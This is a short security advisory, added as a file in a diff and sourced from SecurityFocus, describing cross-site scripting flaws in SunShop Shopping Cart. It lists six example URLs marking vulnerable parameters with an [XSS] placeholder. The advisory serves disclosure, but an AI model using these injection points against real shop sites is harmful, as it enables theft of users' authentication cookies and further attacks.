@@ -1,0 +1,12 @@
+source: http://www.securityfocus.com/bid/17770/info
+
+SunShop Shopping Cart is prone to multiple cross-site scripting vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input. 
+
+An attacker may leverage these issues to have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.
+
+http://www.example.com/index.php?action=item&id=15&prevaction=[XSS]
+http://www.example.com/index.php?action=item&id=15&prevaction=category&previd=[XSS]
+http://www.example.com/index.php?action=item&id=15&prevaction=category&previd=2&prevstart=[XSS]
+http://www.example.com/index.php?action=sendtofriend&type=item&itemid=[XSS]
+http://www.example.com/index.php?action=item&id=[XSS]
+http://www.example.com/index.php?action=[XSS]
